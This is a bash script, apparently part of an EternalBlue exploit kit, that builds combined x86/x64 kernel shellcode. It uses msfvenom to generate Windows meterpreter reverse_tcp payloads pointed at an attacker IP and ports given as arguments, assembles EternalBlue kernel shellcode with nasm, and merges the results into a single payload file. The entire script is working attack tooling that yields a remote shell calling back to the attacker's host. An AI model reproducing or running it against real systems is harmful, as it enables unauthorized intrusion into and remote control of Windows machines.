#!/bin/bash

# change these values to your attacking IP and 2 ports for 32bit/64bit Architecture
attackerIP="$1" # put your ip here*
arch_x86_port="$2"  # x86 msfconsole multi handler port (optional change)
arch_x64_port="$3" # x64 msfconsole multi handler port (optional change)

rm -rf $PWD/{output,bin}

mkdir -p $PWD/{output,bin}

# binary files generated by metasploit
x86_msf_shellcode=$PWD"/bin/sc_x86_msf.bin"
x64_msf_shellcode=$PWD"/bin/sc_x64_msf.bin"

x86_shellcode=$PWD"/bin/sc_x86.bin"
x64_shellcode=$PWD"/bin/sc_x64.bin"

# all our shellcode successfully compiled
all_shellcode=$PWD"/bin/sc_all.bin"

mergeScript=$PWD"/merge_shellcode.py"

# base file name of Worawits raw Assembly.
rawAssembly_x64=$PWD"/assembly/eternalblue_kshellcode_x64"
rawAssembly_x86=$PWD"/assembly/eternalblue_kshellcode_x86"

# remove all dynamically generate files to start fresh!
rm $rawAssembly_x64 $rawAssembly_x86 2>/dev/null

msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o $x64_msf_shellcode EXITFUNC=thread LHOST=$attackerIP LPORT=$arch_x64_port

msfvenom -p windows/meterpreter/reverse_tcp -f raw -o $x86_msf_shellcode EXITFUNC=thread LHOST=$attackerIP LPORT=$arch_x86_port

nasm -f bin $rawAssembly_x64.asm

nasm -f bin $rawAssembly_x86.asm

cat $rawAssembly_x86 $x86_msf_shellcode > $x86_shellcode

cat $rawAssembly_x64 $x64_msf_shellcode > $x64_shellcode

python $mergeScript $x86_shellcode $x64_shellcode $all_shellcode
